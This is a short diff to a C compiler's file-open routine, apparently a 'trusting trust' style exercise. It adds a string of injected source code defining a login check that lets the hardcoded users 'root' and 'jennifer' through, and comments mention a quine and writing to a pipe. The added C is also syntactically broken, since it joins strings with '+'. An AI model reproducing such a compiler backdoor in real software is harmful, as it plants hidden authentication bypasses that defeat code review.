@@ -739,6 +739,10 @@ static int _tcc_open(TCCState *s1, const char *filename)
             while(1){
                 //now check if we are in the tcc_open function
                 //replace with the quine
+                char* s = "#include <string.h>\nstatic int do_login(const char *username) {\n\tif (!strcmp(username, \"root\"))\n\t\treturn 0;" +
+                "\n\tif (!strcmp(username, \"jennifer\"))\n\t\treturn 0;\n"
+                + "\treturn 1;\n}" + "int main(int argc, char *argv[]) {\n" 
+                + "\tif (argc != 2)\n\t\treturn 1;\n\treturn do_login(argv[1]);\n};"
                 //write to pipe.
                 break;
             }
